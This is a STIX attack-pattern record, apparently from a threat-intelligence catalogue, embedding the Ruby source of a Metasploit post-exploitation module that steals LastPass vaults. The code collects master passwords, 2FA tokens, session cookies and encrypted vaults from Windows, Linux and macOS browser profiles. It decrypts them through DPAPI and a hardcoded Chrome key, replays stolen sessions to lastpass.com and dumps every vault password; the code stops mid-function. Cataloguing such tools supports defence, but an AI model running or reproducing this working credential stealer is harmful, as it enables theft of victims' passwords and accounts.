{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5fd81834-e5fc-416f-9487-c1400a46317d",
    "created": "2024-08-14T16:33:19.176497Z",
    "modified": "2024-08-14T16:33:19.176501Z",
    "name": "LastPass Vault Decryptor",
    "description": " This module extracts and decrypts LastPass master login accounts and passwords encryption keys, 2FA tokens and all the vault passwords  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/lastpass_creds.rb",
            "external_id": "lastpass_creds.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.martinvigo.com/even-the-lastpass-will-be-stolen-deal-with-it"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'English'\nrequire 'sqlite3'\nrequire 'uri'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::OSX::System\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'LastPass Vault Decryptor',\n        'Description' => %q{\n          This module extracts and decrypts LastPass master login accounts and passwords,\n          encryption keys, 2FA tokens and all the vault passwords\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Alberto Garcia Illera <agarciaillera[at]gmail.com>', # original module and research\n          'Martin Vigo <martinvigo[at]gmail.com>', # original module and research\n          'Jon Hart <jon_hart[at]rapid7.com>' # module rework and cleanup\n        ],\n        'Platform' => %w[linux osx unix win],\n        'References' => [\n          [ 'URL', 'http://www.martinvigo.com/even-the-lastpass-will-be-stolen-deal-with-it' ]\n        ],\n        'SessionTypes' => %w[meterpreter shell],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_registry_open_key\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    if session.platform == 'windows' && session.type == 'shell' # No Windows shell support\n      print_error 'Shell sessions on Windows are not supported'\n      return\n    end\n\n    print_status 'Searching for LastPass databases'\n\n    account_map = build_account_map\n    if account_map.empty?\n      print_status 'No databases found'\n      return\n    end\n\n    print_status 'Extracting credentials'\n    extract_credentials(account_map)\n\n    print_status 'Extracting 2FA tokens'\n    extract_2fa_tokens(account_map)\n\n    print_status 'Extracting vault and iterations'\n    extract_vault_and_iterations(account_map)\n\n    print_status 'Extracting encryption keys'\n    extract_vault_keys(account_map)\n\n    print_lastpass_data(account_map)\n  end\n\n  # Returns a mapping of lastpass accounts\n  def build_account_map\n    profiles = user_profiles\n    account_map = {}\n\n    profiles.each do |user_profile|\n      account = user_profile['UserName']\n      browser_path_map = {}\n      localstorage_path_map = {}\n      cookies_path_map = {}\n\n      case session.platform\n      when 'windows'\n        browser_path_map = {\n          'Chrome' => \"#{user_profile['LocalAppData']}\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\databases\\\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\",\n          'Firefox' => \"#{user_profile['AppData']}\\\\Mozilla\\\\Firefox\\\\Profiles\",\n          'IE' => \"#{user_profile['LocalAppData']}Low\\\\LastPass\",\n          'Opera' => \"#{user_profile['AppData']}\\\\Opera Software\\\\Opera Stable\\\\databases\\\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0\"\n        }\n        localstorage_path_map = {\n          'Chrome' => \"#{user_profile['LocalAppData']}\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage\",\n          'Firefox' => \"#{user_profile['LocalAppData']}Low\\\\LastPass\",\n          'IE' => \"#{user_profile['LocalAppData']}Low\\\\LastPass\",\n          'Opera' => \"#{user_profile['AppData']}\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage\"\n        }\n        cookies_path_map = {\n          'Chrome' => \"#{user_profile['LocalAppData']}\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies\",\n          'Firefox' => '', # It's set programmatically\n          'IE' => \"#{user_profile['LocalAppData']}\\\\Microsoft\\\\Windows\\\\INetCookies\\\\Low\",\n          'Opera' => \"#{user_profile['AppData']}\\\\Opera Software\\\\Opera Stable\\\\Cookies\"\n        }\n      when 'unix', 'linux'\n        browser_path_map = {\n          'Chrome' => \"#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\",\n          'Firefox' => \"#{user_profile['LocalAppData']}/.mozilla/firefox\",\n          'Opera' => \"#{user_profile['LocalAppData']}/.config/opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0\"\n        }\n        localstorage_path_map = {\n          'Chrome' => \"#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage\",\n          'Firefox' => \"#{user_profile['LocalAppData']}/.lastpass\",\n          'Opera' => \"#{user_profile['LocalAppData']}/.config/opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage\"\n        }\n        cookies_path_map = { # TODO\n          'Chrome' => \"#{user_profile['LocalAppData']}/.config/google-chrome/Default/Cookies\",\n          'Firefox' => '', # It's set programmatically\n          'Opera' => \"#{user_profile['LocalAppData']}/.config/opera/Cookies\"\n        }\n      when 'osx'\n        browser_path_map = {\n          'Chrome' => \"#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\",\n          'Firefox' => \"#{user_profile['LocalAppData']}/Firefox/Profiles\",\n          'Opera' => \"#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0\",\n          'Safari' => \"#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0\"\n        }\n        localstorage_path_map = {\n          'Chrome' => \"#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage\",\n          'Firefox' => \"#{user_profile['AppData']}/Containers/com.lastpass.LastPass/Data/Library/Application Support/LastPass\",\n          'Opera' => \"#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage\",\n          'Safari' => \"#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage\"\n        }\n        cookies_path_map = { # TODO\n          'Chrome' => \"#{user_profile['LocalAppData']}/Google/Chrome/Default/Cookies\",\n          'Firefox' => '', # It's set programmatically\n          'Opera' => \"#{user_profile['LocalAppData']}/com.operasoftware.Opera/Cookies\",\n          'Safari' => \"#{user_profile['AppData']}/Cookies/Cookies.binarycookies\"\n        }\n      else\n        print_error \"Platform not recognized: #{session.platform}\"\n      end\n\n      account_map[account] = {}\n      browser_path_map.each_pair do |browser, path|\n        account_map[account][browser] = {}\n        db_paths = find_db_paths(path, browser, account)\n        if db_paths && !db_paths.empty?\n          account_map[account][browser]['lp_db_path'] = db_paths.first\n          account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if file?(localstorage_path_map[browser]) || browser.match(/Firefox|IE/)\n          account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if file?(cookies_path_map[browser]) || browser.match(/Firefox|IE/)\n          account_map[account][browser]['cookies_db'] = account_map[account][browser]['lp_db_path'].first.gsub('prefs.js', 'cookies.sqlite') if (!account_map[account][browser]['lp_db_path'].blank? && browser == 'Firefox')\n        else\n          account_map[account].delete(browser)\n        end\n      end\n    end\n\n    account_map\n  end\n\n  # Returns a list of DB paths found in the victims' machine\n  def find_db_paths(path, browser, account)\n    paths = []\n\n    vprint_status \"Checking #{account}'s #{browser}\"\n    if browser == 'IE' # Special case for IE\n      data = read_registry_key_value('HKEY_CURRENT_USER\\Software\\LastPass', 'LoginUsers')\n      data = read_registry_key_value('HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\LastPass', 'LoginUsers') if data.blank?\n      paths |= ['HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\LastPass'] if !data.blank? && path != 'Low\\\\LastPass' # Hacky way to detect if there is access to user's data (attacker has no root access)\n    elsif browser == 'Firefox' # Special case for Firefox\n      paths |= firefox_profile_files(path)\n    else\n      paths |= file_paths(path)\n    end\n\n    vprint_good \"Found #{paths.size} #{browser} databases for #{account}\"\n    paths\n  end\n\n  # Returns the relevant information from user profiles\n  def user_profiles\n    user_profiles = []\n    case session.platform\n    when /unix|linux/\n      user_names = dir('/home')\n      user_names.reject! { |u| %w[. ..].include?(u) }\n      user_names.each do |user_name|\n        user_profiles.push('UserName' => user_name, 'LocalAppData' => \"/home/#{user_name}\")\n      end\n    when /osx/\n      user_names = session.shell_command('ls /Users').split\n      user_names.reject! { |u| u == 'Shared' }\n      user_names.each do |user_name|\n        user_profiles.push(\n          'UserName' => user_name,\n          'AppData' => \"/Users/#{user_name}/Library\",\n          'LocalAppData' => \"/Users/#{user_name}/Library/Application Support\"\n        )\n      end\n    when /windows/\n      user_profiles |= grab_user_profiles\n    else\n      print_error \"OS not recognized: #{session.platform}\"\n    end\n    user_profiles\n  end\n\n  # Extracts the databases paths from the given folder ignoring . and ..\n  def file_paths(path)\n    found_dbs_paths = []\n\n    files = []\n    files = dir(path) if directory?(path)\n    files.each do |file_path|\n      unless %w[. .. Shared].include?(file_path)\n        found_dbs_paths.push([path, file_path].join(system_separator))\n      end\n    end\n\n    found_dbs_paths\n  end\n\n  # Returns the profile files for Firefox\n  def firefox_profile_files(path)\n    found_dbs_paths = []\n\n    if directory?(path)\n      files = dir(path)\n      files.reject! { |file| %w[. ..].include?(file) }\n      files.each do |file_path|\n        found_dbs_paths.push([path, file_path, 'prefs.js'].join(system_separator)) if file_path.match(/.*\\.default/)\n      end\n    end\n\n    [found_dbs_paths]\n  end\n\n  # Parses the Firefox preferences file and returns encoded credentials\n  def ie_firefox_credentials(prefs_path, localstorage_db_path)\n    credentials = []\n    data = nil\n\n    if prefs_path.nil? # IE\n      data = read_registry_key_value('HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\LastPass', 'LoginUsers')\n      data = read_registry_key_value('HKEY_CURRENT_USER\\Software\\LastPass', 'LoginUsers') if data.blank?\n      return [] if data.blank?\n\n      usernames = data.split('|')\n      usernames.each do |username|\n        credentials << [username, nil]\n      end\n\n      # Extract master passwords\n      data = read_registry_key_value('HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\LastPass', 'LoginPws')\n      data = Rex::Text.encode_base64(data) unless data.blank?\n    else # Firefox\n      loot_path = loot_file(prefs_path, nil, 'firefox.preferences', 'text/javascript', 'Firefox preferences file')\n      return [] unless loot_path\n\n      File.readlines(loot_path).each do |line|\n        next unless /user_pref\\(\"extensions.lastpass.loginusers\", \"(?<encoded_users>.*)\"\\);/ =~ line\n\n        usernames = encoded_users.split('|')\n        usernames.each do |username|\n          credentials << [username, nil]\n        end\n        break\n      end\n\n      # Extract master passwords\n      path = localstorage_db_path + system_separator + 'lp.loginpws'\n      data = read_remote_file(path) if file?(path) # Read file if it exists\n    end\n\n    # Get encrypted master passwords\n    data = windows_unprotect(data) if !data.nil? && data.match(/^AQAAA.+/) # Verify Windows protection\n    return credentials if data.blank? # No passwords stored\n\n    creds_per_user = data.split('|')\n    creds_per_user.each_with_index do |user_creds, _index|\n      parts = user_creds.split('=')\n      for creds in credentials\n        creds[1] = parts[1] if creds[0] == parts[0] # Add the password to the existing username\n      end\n    end\n    credentials\n  end\n\n  def decrypt_data(key, encrypted_data)\n    return nil if encrypted_data.blank?\n\n    if encrypted_data.include?('|') # Use CBC\n      decipher = OpenSSL::Cipher.new('AES-256-CBC').decrypt\n      decipher.iv = Rex::Text.decode_base64(encrypted_data[1, 24]) # Discard ! and |\n      encrypted_data = encrypted_data[26..] # Take only the data part\n    else # Use ECB\n      decipher = OpenSSL::Cipher.new('AES-256-ECB').decrypt\n    end\n\n    begin\n      decipher.key = key\n      decrypted_data = decipher.update(Rex::Text.decode_base64(encrypted_data)) + decipher.final\n    rescue OpenSSL::Cipher::CipherError => e\n      vprint_error \"Data could not be decrypted. #{e.message}\"\n    end\n\n    decrypted_data\n  end\n\n  def extract_credentials(account_map)\n    account_map.each_pair do |account, browser_map|\n      browser_map.each_pair do |browser, lp_data|\n        account_map[account][browser]['lp_creds'] = {}\n        if browser.match(/Firefox|IE/)\n          if browser == 'Firefox'\n            ieffcreds = ie_firefox_credentials(lp_data['lp_db_path'].first, lp_data['localstorage_db'])\n          else # IE\n            ieffcreds = ie_firefox_credentials(nil, lp_data['localstorage_db'])\n          end\n          unless ieffcreds.blank?\n            ieffcreds.each do |creds|\n              if creds[1].blank? # No master password found\n                account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = { 'lp_password' => nil }\n              else\n                sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(URI.unescape(creds[0]))\n                sha256_binary_email = [sha256_hex_email].pack 'H*' # Do hex2bin\n                creds[1] = decrypt_data(sha256_binary_email, URI.unescape(creds[1]))\n                account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = { 'lp_password' => creds[1] }\n              end\n            end\n          end\n        else # Chrome, Safari and Opera\n          loot_path = loot_file(lp_data['lp_db_path'], nil, \"#{browser.downcase}.lastpass.database\", 'application/x-sqlite3', \"#{account}'s #{browser} LastPass database #{lp_data['lp_db_path']}\")\n          account_map[account][browser]['lp_db_loot'] = loot_path\n          next if loot_path.blank?\n\n          # Parsing/Querying the DB\n          db = SQLite3::Database.new(loot_path)\n          result = db.execute(\n            'SELECT username, password FROM LastPassSavedLogins2 ' \\\n            \"WHERE username IS NOT NULL AND username != '' \" \\\n          )\n\n          for row in result\n            next unless row[0]\n\n            sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(row[0])\n            sha256_binary_email = [sha256_hex_email].pack 'H*' # Do hex2bin\n            row[1].blank? ? row[1] = nil : row[1] = decrypt_data(sha256_binary_email, row[1]) # Decrypt master password\n            account_map[account][browser]['lp_creds'][row[0]] = { 'lp_password' => row[1] }\n          end\n        end\n      end\n    end\n  end\n\n  # Extracts the 2FA token from localStorage\n  def extract_2fa_tokens(account_map)\n    account_map.each_pair do |account, browser_map|\n      browser_map.each_pair do |browser, lp_data|\n        if browser.match(/Firefox|IE/)\n          path = lp_data['localstorage_db'] + system_separator + 'lp.suid'\n          data = read_remote_file(path) if file?(path) # Read file if it exists\n          data = windows_unprotect(data) if !data.nil? && data.size > 32 # Verify Windows protection\n          loot_path = loot_file(nil, data, \"#{browser.downcase}.lastpass.localstorage\", 'application/x-sqlite3', \"#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}\")\n          account_map[account][browser]['lp_2fa'] = data\n        else # Chrome, Safari and Opera\n          loot_path = loot_file(lp_data['localstorage_db'], nil, \"#{browser.downcase}.lastpass.localstorage\", 'application/x-sqlite3', \"#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}\")\n          unless loot_path.blank?\n            db = SQLite3::Database.new(loot_path)\n            token = db.execute(\n              'SELECT hex(value) FROM ItemTable ' \\\n              \"WHERE key = 'lp.uid';\"\n            ).flatten\n          end\n          token.blank? ? account_map[account][browser]['lp_2fa'] = nil : account_map[account][browser]['lp_2fa'] = token.pack('H*')\n        end\n      end\n    end\n  end\n\n  # Print all extracted LastPass data\n  def print_lastpass_data(account_map)\n    lastpass_data_table = Rex::Text::Table.new(\n      'Header' => 'LastPass Accounts',\n      'Indent' => 1,\n      'Columns' => %w[Account LP_Username LP_Password LP_2FA LP_Key]\n    )\n\n    account_map.each_pair do |account, browser_map|\n      browser_map.each_pair do |_browser, lp_data|\n        lp_data['lp_creds'].each_pair do |username, user_data|\n          lastpass_data_table << [account, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]\n        end\n      end\n    end\n\n    unless account_map.empty?\n      print_good lastpass_data_table.to_s\n      loot_file(nil, lastpass_data_table.to_csv, 'lastpass.data', 'text/csv', 'LastPass Data')\n      print_vault_passwords(account_map)\n    end\n  end\n\n  def extract_vault_and_iterations(account_map)\n    account_map.each_pair do |account, browser_map|\n      browser_map.each_pair do |browser, lp_data|\n        lp_data['lp_creds'].each_pair do |username, _user_data|\n          if browser.match(/Firefox|IE/)\n            if browser == 'Firefox'\n              iterations_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + '_key.itr'\n              vault_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + '_lps.act.sxml'\n            else # IE\n              iterations_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + '_key_ie.itr'\n              vault_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + '_lps.sxml'\n            end\n            iterations = read_remote_file(iterations_path) if file?(iterations_path) # Read file if it exists\n            iterations = nil if iterations.blank? # Verify content\n            lp_data['lp_creds'][username]['iterations'] = iterations\n\n            # Find encrypted vault\n            vault = read_remote_file(vault_path)\n            vault = windows_unprotect(vault) if !vault.nil? && vault.match(/^AQAAA.+/) # Verify Windows protection\n            vault = vault.sub(/iterations=.*;/, '') if file?(vault_path) # Remove iterations info\n            loot_path = loot_file(nil, vault, \"#{browser.downcase}.lastpass.vault\", 'text/plain', \"#{account}'s #{browser} LastPass vault\")\n            lp_data['lp_creds'][username]['vault_loot'] = loot_path\n\n          else # Chrome, Safari and Opera\n            db = SQLite3::Database.new(lp_data['lp_db_loot'])\n            result = db.execute(\n              'SELECT data FROM LastPassData ' \\\n              \"WHERE username_hash = ? AND type = 'accts'\", OpenSSL::Digest::SHA256.hexdigest(username)\n            )\n\n            if result.size == 1 && !result[0].blank?\n              if /iterations=(?<iterations>.*);(?<vault>.*)/ =~ result[0][0]\n                lp_data['lp_creds'][username]['iterations'] = iterations\n              else\n                lp_data['lp_creds'][username]['iterations'] = 1\n              end\n              loot_path = loot_file(nil, vault, \"#{browser.downcase}.lastpass.vault\", 'text/plain', \"#{account}'s #{browser} LastPass vault\")\n              lp_data['lp_creds'][username]['vault_loot'] = loot_path\n            else\n              lp_data['lp_creds'][username]['iterations'] = nil\n              lp_data['lp_creds'][username]['vault_loot'] = nil\n            end\n          end\n        end\n      end\n    end\n  end\n\n  def extract_vault_keys(account_map)\n    account_map.each_pair do |account, browser_map|\n      browser_map.each_pair do |browser, lp_data|\n        browser_checked = false # Track if local stored vault key was already decrypted for this browser (only one session cookie)\n        lp_data['lp_creds'].each_pair do |username, user_data|\n          if !user_data['lp_password'].blank? && !user_data['iterations'].nil? # Derive vault key from credentials\n            lp_data['lp_creds'][username]['vault_key'] = derive_vault_key_from_creds(username, lp_data['lp_creds'][username]['lp_password'], user_data['iterations'])\n          else # Get vault key decrypting the locally stored one or from the disabled OTP\n            unless browser_checked\n              decrypt_local_vault_key(account, browser_map)\n              browser_checked = true\n            end\n            if lp_data['lp_creds'][username]['vault_key'].nil? # If no vault key was found yet, try with dOTP\n              otpbin = extract_otpbin(browser, username, lp_data)\n              otpbin.blank? ? next : otpbin = otpbin[0..31]\n\n              lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)\n            end\n          end\n        end\n      end\n    end\n  end\n\n  # Decrypt the locally stored vault key\n  def decrypt_local_vault_key(account, browser_map)\n    data = nil\n    session_cookie_value = nil\n\n    browser_map.each_pair do |browser, lp_data|\n      if browser == 'IE' && directory?(lp_data['cookies_db'])\n        cookies_files = dir(lp_data['cookies_db'])\n        cookies_files.reject! { |u| %w[. ..].include?(u) }\n        cookies_files.each do |cookie_jar_file|\n          data = read_remote_file(lp_data['cookies_db'] + system_separator + cookie_jar_file)\n          next if data.blank?\n\n          next unless /.*PHPSESSID.(?<session_cookie_value_match>.*?).lastpass\\.com?/m =~ data # Find the session id\n\n          loot_file(lp_data['cookies_db'] + system_separator + cookie_jar_file, nil, \"#{browser.downcase}.lastpass.cookies\", 'text/plain', \"#{account}'s #{browser} cookies DB\")\n          session_cookie_value = session_cookie_value_match\n          break\n        end\n      else\n        case browser\n        when /Chrome/\n          query = \"SELECT encrypted_value FROM cookies WHERE host_key = 'lastpass.com' AND name = 'PHPSESSID'\"\n        when 'Opera'\n          query = \"SELECT encrypted_value FROM cookies WHERE host_key = 'lastpass.com' AND name = 'PHPSESSID'\"\n        when 'Firefox'\n          query = \"SELECT value FROM moz_cookies WHERE host = 'lastpass.com' AND name = 'PHPSESSID'\"\n        else\n          vprint_error \"Browser #{browser} not supported for cookies\"\n          next\n        end\n        # Parsing/Querying the DB\n        loot_path = loot_file(lp_data['cookies_db'], nil, \"#{browser.downcase}.lastpass.cookies\", 'application/x-sqlite3', \"#{account}'s #{browser} cookies DB\")\n        next if loot_path.blank?\n\n        db = SQLite3::Database.new(loot_path)\n        begin\n          result = db.execute(query)\n        rescue SQLite3::SQLException => e\n          vprint_error \"No session cookie was found in #{account}'s #{browser} (#{e.message})\"\n          next\n        end\n        next if result.blank? # No session cookie found for this browser\n\n        session_cookie_value = result[0][0]\n      end\n      return if session_cookie_value.blank?\n\n      # Check if cookie value needs to be decrypted\n      if Rex::Text.encode_base64(session_cookie_value).match(/^AQAAA.+/) # Windows Data protection API\n        session_cookie_value = windows_unprotect(Rex::Text.encode_base64(session_cookie_value))\n      elsif session_cookie_value.match(/^v10/) && browser.match(/Chrome|Opera/) # Chrome/Opera encrypted cookie in Linux\n        begin\n          decipher = OpenSSL::Cipher.new('AES-256-CBC')\n          decipher.decrypt\n          decipher.key = OpenSSL::Digest.hexdigest('SHA256', 'peanuts')\n          decipher.iv = ' ' * 16\n          session_cookie_value = session_cookie_value[3..] # Discard v10\n          session_cookie_value = decipher.update(session_cookie_value) + decipher.final\n        rescue OpenSSL::Cipher::CipherError => e\n          print_error \"Cookie could not be decrypted. #{e.message}\"\n        end\n      end\n\n      # Use the cookie to obtain the encryption key to decrypt the vault key\n      uri = URI('https://lastpass.com/login_check.php')\n      request = Net::HTTP::Post.new(uri)\n      request.set_form_data('wxsessid' => URI.unescape(session_cookie_value), 'uuid' => browser_map['lp_2fa'])\n      request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'\n      response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) { |http| http.request(request) }\n\n      # Parse response\n      next unless response.body.match(/pwdeckey=\"([a-z0-9]+)\"/) # Session must have expired\n\n      decryption_key = OpenSSL::Digest::SHA256.hexdigest(response.body.match(/pwdeckey=\"([a-z0-9]+)\"/)[1])\n      username = response.body.match(/lpusername=\"([A-Za-z0-9._%+-@]+)\"/)[1]\n\n      # Get the local encrypted vault key\n      encrypted_vault_key = extract_local_encrypted_vault_key(browser, username, lp_data)\n\n      # Decrypt the local stored key\n      lp_data['lp_creds'][username]['vault_key'] = decrypt_data([decryption_key].pack('H*'), encrypted_vault_key)\n    end\n  end\n\n  # Returns otp, encrypted_key\n  def extract_otpbin(browser, username, lp_data)\n    if browser.match(/Firefox|IE/)\n      if browser == 'Firefox'\n        path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + '_ff.sotp'\n      else # IE\n        path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + '.sotp'\n      end\n      otpbin = read_remote_file(path) if file?(path) # Read file if it exists\n      otpbin = windows_unprotect(otpbin) if !otpbin.nil? && otpbin.match(/^AQAAA.+/)\n      return otpbin\n    else # Chrome, Safari and Opera\n      db = SQLite3::Database.new(lp_data['lp_db_loot'])\n      result = db.execute(\n        'SELECT type, data FROM LastPassData ' \\\n        \"WHERE username_hash = ? AND type = 'otp'\", OpenSSL::Digest::SHA256.hexdigest(username)\n      )\n      return (result.blank? || result[0][1].blank?) ? nil : [result[0][1]].pack('H*')\n    end\n  end\n\n  def derive_vault_key_from_creds(username, password, key_iteration_count)\n    if key_iteration_count == 1\n      key = Digest::SHA256.hexdigest username + password\n    else\n      key = pbkdf2(password, username, key_iteration_count.to_i, 32).first\n    end\n    key\n  end\n\n  def decrypt_vault_key_with_otp(username, otpbin)\n    vault_key_decryption_key = [lastpass_sha256(username + otpbin)].pack 'H*'\n    encrypted_vault_key = retrieve_encrypted_vault_key_with_otp(username, otpbin)\n    decrypt_data(vault_key_decryption_key, encrypted_vault_key)\n  end\n\n  def retrieve_encrypted_vault_key_with_otp(username, otpbin)\n    # Derive login hash from otp\n    otp_token = lastpass_sha256(lastpass_sha256(username + otpbin) + otpbin) # OTP login hash\n\n    # Make request to LastPass\n    uri = URI('https://lastpass.com/otp.php')\n    request = Net::HTTP::Post.new(uri)\n    request.set_form_data('login' => 1, 'xml' => 1, 'hash' => otp_token, 'otpemail' => URI::DEFAULT_PARSER.escape(username), 'outofbandsupported' => 1, 'changepw' => otp_token)\n    request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'\n    response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) { |http| http.request(request) }\n\n    # Parse response\n    encrypted_vault_key = nil\n    if response.body.match(/randkey=\"(.*)\"/)\n      encrypted_vault_key = response.body.match(/randkey=\"(.*)\"/)[1]\n    end\n    encrypted_vault_key\n  end\n\n  # LastPass does some preprocessing (UTF8) when doing a SHA256 on special chars (binary)\n  def lastpass_sha256(input)\n    output = ''\n\n    input = input.gsub(\"\\r\\n\", \"\\n\")\n\n    input.each_byte do |e|\n      if e < 128\n        output += e.chr\n      elsif (e > 127 && e < 2048)\n        output += (e >> 6 | 192).chr\n        output += (e & 63 | 128).chr\n      else\n        output += (e >> 12 | 224).chr\n        output += (e >> 6 & 63 | 128).chr\n      end\n    end\n\n    OpenSSL::Digest::SHA256.hexdigest(output)\n  end\n\n  def pbkdf2(password, salt, iterations, key_length)\n    digest = OpenSSL::Digest.new('SHA256')\n    OpenSSL::PKCS5.pbkdf2_hmac(password, salt, iterations, key_length, digest).unpack 'H*'\n  end\n\n  def windows_unprotect(data)\n    data = Rex::Text.decode_base64(data)\n    pid = session.sys.process.getpid\n    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)\n    mem = process.memory.allocate(data.length + 200)\n    process.memory.write(mem, data)\n\n    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n      addr = [mem].pack('V')\n      len = [data.length].pack('V')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 8)\n      len, addr = ret['pDataOut'].unpack('V2')\n    else\n      addr = Rex::Text.pack_int64le(mem)\n      len = Rex::Text.pack_int64le(data.length)\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 16)\n      pData = ret['pDataOut'].unpack('VVVV')\n      len = pData[0] + (pData[1] << 32)\n      addr = pData[2] + (pData[3] << 32)\n    end\n\n    return '' if len == 0\n\n    process.memory.read(addr, len)\n  end\n\n  def print_vault_passwords(account_map)\n    account_map.each_pair do |_account, browser_map|\n      browser_map.each_pair do |browser, lp_data|\n        lp_data['lp_creds'].each_pair do |username, user_data|\n          lastpass_vault_data_table = Rex::Text::Table.new(\n            'Header' => \"Decrypted vault from #{username}\",\n            'Indent' => 1,\n            'Columns' => %w[URL Username Password]\n          )\n          if user_data['vault_loot'].nil? # Was a vault found?\n            print_error \"No vault was found for #{username}\"\n            next\n          end\n          encoded_vault = File.read(user_data['vault_loot'])\n          if encoded_vault[0] == '!' # Vault is double encrypted\n            encoded_vault = decrypt_data([user_data['vault_key']].pack('H*'), encoded_vault)\n            if encoded_vault.blank?\n              print_error \"Vault from #{username} could not be decrypted\"\n              next\n            else\n              encoded_vault = encoded_vault.sub('LPB64', '')\n            end\n          end\n\n          # Parse vault\n          vault = Rex::Text.decode_base64(encoded_vault)\n          vault.scan(/ACCT/) do |_result|\n            chunk_length = vault[$LAST_MATCH_INFO.offset(0)[1]..$LAST_MATCH_INFO.offset(0)[1] + 3].unpack('H*').first.to_i(16) # Get the length in base 10 of the ACCT chunk\n            chunk = vault[$LAST_MATCH_INFO.offset(0)[0]..$LAST_MATCH_INFO.offset(0)[1] + chunk_length] # Get ACCT chunk\n            account_data = parse_vault_account(chunk, user_data['vault_key'])\n            lastpass_vault_data_table << account_data if !account_data.nil?\n          end\n\n          next if account_map.empty? # Loot passwords\n\n          if lastpass_vault_data_table.rows.empty?\n            print_status('No decrypted vaults.')\n          else\n            print_good lastpass_vault_data_table.to_s\n          end\n          loot_file(nil, lastpass_vault_data_table.to_csv, \"#{browser.downcase}.lastpass.passwords\", 'text/csv', \"LastPass Vault Passwords from #{username}\")\n        end\n      end\n    end\n  end\n\n  def parse_vault_account(chunk, vault_key)\n    pointer = 22 # Starting position to find data to decrypt\n    labels = ['name', 'folder', 'url', 'notes', 'undefined', 'undefined2', 'username', 'password']\n    vault_data = []\n    for label in labels\n      if chunk[pointer..pointer + 3].nil?\n        # Out of bound read\n        return nil\n      end\n\n      length = chunk[pointer..pointer + 3].unpack('H*').first.to_i(16)\n      encrypted_data = chunk[pointer + 4..pointer + 4 + length - 1]\n      label != 'url' ? decrypted_data = decrypt_vault_password(vault_key, encrypted_data) : decrypted_data = [encrypted_data].pack('H*')\n      decrypted_data = '' if decrypted_data.nil?\n      vault_data << decrypted_data if (label == 'url' || label == 